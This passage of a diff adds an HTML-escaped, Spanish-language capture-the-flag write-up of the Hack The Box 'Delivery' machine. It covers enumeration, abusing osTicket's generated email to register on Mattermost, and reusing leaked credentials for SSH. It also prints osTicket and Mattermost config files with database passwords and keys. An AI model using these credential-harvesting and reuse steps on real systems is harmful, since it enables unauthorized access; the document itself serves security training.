+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;?&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started at	: 2021-02-10 18:38:43
+
+GET	&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK				http://delivery.htb/
+GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://delivery.htb/index.html
+GET     &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; Moved Permanently           http://delivery.htb/images
+						&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://delivery.htb/images/
+GET     &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; Moved Permanently           http://delivery.htb/assets
+						&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://delivery.htb/assets/
+GET     &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; Moved Permanently           http://delivery.htb/error
+						&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://delivery.htb/error/
+GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://delivery.htb/
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;?&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Ended at: 2021-02-10 21:28:42
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;mattermost&#34;&gt;Mattermost&lt;/h1&gt;
+&lt;p&gt;En el puerto 8065 encontramos el login de Mattermost.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/delivery/Screenshot_20210210_212339.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h1 id=&#34;user&#34;&gt;USER&lt;/h1&gt;
+&lt;h2 id=&#34;osticket&#34;&gt;osTicket&lt;/h2&gt;
+&lt;p&gt;Con el nuevo subdominio agregado a nuestro archivo &lt;code&gt;/etc/hosts&lt;/code&gt; encontramos &lt;code&gt;osTicket&lt;/code&gt;, &lt;a href=&#34;https://avantys.com/clientes/knowledgebase/89/Que-es-OsTicket.html&#34;&gt;&lt;strong&gt;osTicket&lt;/strong&gt;&lt;/a&gt; es un sistema de soporte que administra solicitudes de soporte, y, por usuario &lt;strong&gt;crea un email&lt;/strong&gt; para que éste pueda revisar el status del ticket enviado, al investigar posibles vulnerabilidades encontramos una: &lt;a href=&#34;https://www.exploit-db.com/exploits/49441&#34;&gt;&lt;strong&gt;SSRF&lt;/strong&gt;&lt;/a&gt; aunque no es fue de ayuda.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/delivery/Screenshot_20210210_174454.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;osticket--mattermost&#34;&gt;osTicket &amp;gt; Mattermost&lt;/h2&gt;
+&lt;p&gt;En la pagina &amp;ldquo;estatica&amp;rdquo; se mencionaba que para aquellos usuarios que no se han registrado, deben realizarlo a traves de &lt;code&gt;HelpDesk (helpdesk.delivery.htb - osTicket)&lt;/code&gt;, una vez registrado pueden acceder a MatterMost, por lo que creamos un ticket en osTicket, al finalizar, nos muestra un mensaje con el id del ticket y un correo generado.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/delivery/Screenshot_20210210_212621.png&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/delivery/Screenshot_20210210_212646.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;El correo &amp;ldquo;generado&amp;rdquo; es el que debemos de utilizar para crear nuestra cuenta en MatterMost, MatterMost enviará el link de activacion a nuestro &amp;lsquo;ticket&amp;rsquo; en osTicket.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/delivery/Screenshot_20210210_212849.png&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/delivery/Screenshot_20210210_213620.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Si verificamos el ticket (utilizando el correo con el que se registro el ticket y el id del ticket generado) vemos que recibimos el correo con el link para activar la cuenta.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/delivery/Screenshot_20210210_213720.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Ingresamos a MatterMost y vemos el unico chat publico con algunos comentarios, en donde mencionan las credenciales del servidor, y que, se desarrolle un programa para que se dejen de reutilizar contraseñas especialmente los que contengan &lt;code&gt;&amp;quot;PleaseSubscribe!&amp;quot;&lt;/code&gt;, tambien que si alguien logran obtener los hashes, facilmente puede obtener en texto plano el valor del hash utilizando reglas de hashcat.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/delivery/Screenshot_20210210_214043.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;osticket-panel&#34;&gt;osTicket Panel&lt;/h2&gt;
+&lt;p&gt;Ingresamos al panel (de agentes) de osTicket utilizando las credenciales encontradas en MatterMost donde vemos la lista de tickets creados, en este panel no encontramos mucho por hacer.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/delivery/Screenshot_20210210_214932.png&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/delivery/Screenshot_20210210_215050.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;ssh&#34;&gt;SSH&lt;/h2&gt;
+&lt;p&gt;Utilizamos las credenciales en el servicio de SSH donde logramos obtener una shell y nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/delivery/Screenshot_20210210_221024.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h1 id=&#34;root&#34;&gt;ROOT&lt;/h1&gt;
+&lt;p&gt;Realizamos una enumeracion y vemos que mysql está corriendo en el puerto 3306, además encontramos las credenciales para la base de datos de osTicket, al ingresar vemos la informacion perteneciente a osTicket.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/delivery/Screenshot_20210210_221301.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;maildeliverer@Delivery:/var/www/osticket/upload$ cat ./include/ost-config.php
+&amp;lt;?php
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# Encrypt/Decrypt secret key - randomly generated during installation.&lt;/span&gt;
+define&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;SECRET_SALT&amp;#39;&lt;/span&gt;,&lt;span class=&#34;s1&#34;&gt;&amp;#39;nP8uygzdkzXRLJzYUmdmLDEqDSq5bGk3&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+&lt;span class=&#34;c1&#34;&gt;#Default admin email. Used only on db connection issues and related alerts.&lt;/span&gt;
+define&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ADMIN_EMAIL&amp;#39;&lt;/span&gt;,&lt;span class=&#34;s1&#34;&gt;&amp;#39;maildeliverer@delivery.htb&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+&lt;span class=&#34;c1&#34;&gt;# Database Options&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# ---------------------------------------------------&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# Mysql Login info&lt;/span&gt;
+define&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;DBTYPE&amp;#39;&lt;/span&gt;,&lt;span class=&#34;s1&#34;&gt;&amp;#39;mysql&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+define&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;DBHOST&amp;#39;&lt;/span&gt;,&lt;span class=&#34;s1&#34;&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+define&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;DBNAME&amp;#39;&lt;/span&gt;,&lt;span class=&#34;s1&#34;&gt;&amp;#39;osticket&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+define&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;DBUSER&amp;#39;&lt;/span&gt;,&lt;span class=&#34;s1&#34;&gt;&amp;#39;ost_user&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+define&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;DBPASS&amp;#39;&lt;/span&gt;,&lt;span class=&#34;s1&#34;&gt;&amp;#39;!H3lpD3sk123!&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Tambien encontramos la configuracion y credenciales de la base de datos de MatterMost, en la base de datos encontramos contraseñas encriptadas de los usuarios.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;maildeliverer@Delivery:/opt/mattermost/config$ cat config.json 
+
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+
+&lt;span class=&#34;s2&#34;&gt;&amp;#34;SqlSettings&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+        &lt;span class=&#34;s2&#34;&gt;&amp;#34;DriverName&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;mysql&amp;#34;&lt;/span&gt;,
+        &lt;span class=&#34;s2&#34;&gt;&amp;#34;DataSource&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s&amp;#34;&lt;/span&gt;,
+        &lt;span class=&#34;s2&#34;&gt;&amp;#34;DataSourceReplicas&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;,
+        &lt;span class=&#34;s2&#34;&gt;&amp;#34;DataSourceSearchReplicas&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;,
+        &lt;span class=&#34;s2&#34;&gt;&amp;#34;MaxIdleConns&amp;#34;&lt;/span&gt;: 20,
+        &lt;span class=&#34;s2&#34;&gt;&amp;#34;ConnMaxLifetimeMilliseconds&amp;#34;&lt;/span&gt;: 3600000,
+        &lt;span class=&#34;s2&#34;&gt;&amp;#34;MaxOpenConns&amp;#34;&lt;/span&gt;: 300,
+        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Trace&amp;#34;&lt;/span&gt;: false,
+        &lt;span class=&#34;s2&#34;&gt;&amp;#34;AtRestEncryptKey&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;n5uax3d4f919obtsp1pw1k5xetq1enez&amp;#34;&lt;/span&gt;,
+        &lt;span class=&#34;s2&#34;&gt;&amp;#34;QueryTimeout&amp;#34;&lt;/span&gt;: 30,
+        &lt;span class=&#34;s2&#34;&gt;&amp;#34;DisableDatabaseSearch&amp;#34;&lt;/span&gt;: &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;
+    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
+
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+
+MariaDB &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;mattermost&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt; describe Users&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
++--------------------+--------------+------+-----+---------+-------+
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Field              &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Type         &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Null &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Key &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Default &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Extra &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
++--------------------+--------------+------+-----+---------+-------+
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Id                 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;26&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NO   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; PRI &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NULL    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; CreateAt           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; bigint&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;20&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; YES  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; MUL &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NULL    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; UpdateAt           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; bigint&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;20&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; YES  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; MUL &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NULL    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; DeleteAt           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; bigint&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;20&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; YES  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; MUL &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NULL    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Username           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; YES  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; UNI &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NULL    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Password           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;128&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; YES  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NULL    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; AuthData           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;128&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; YES  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; UNI &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NULL    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; AuthService        &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;32&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; YES  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NULL    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Email              &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;128&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; YES  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; UNI &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NULL    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; EmailVerified      &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tinyint&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; YES  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NULL    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Nickname           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; YES  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NULL    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; FirstName          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; YES  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NULL    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; LastName           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; YES  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NULL    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Position           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;128&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; YES  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NULL    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
